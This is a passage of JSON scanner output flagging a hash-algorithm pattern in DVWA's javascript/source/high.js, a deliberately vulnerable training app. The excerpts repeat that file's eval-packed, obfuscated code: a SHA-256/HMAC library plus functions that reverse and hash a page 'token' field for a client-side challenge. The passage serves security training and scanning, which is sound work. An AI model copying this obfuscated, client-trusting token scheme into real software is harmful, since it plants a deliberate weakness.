,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 9661,
        "endLocationLine": 1,
        "endLocationColumn": 9665
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b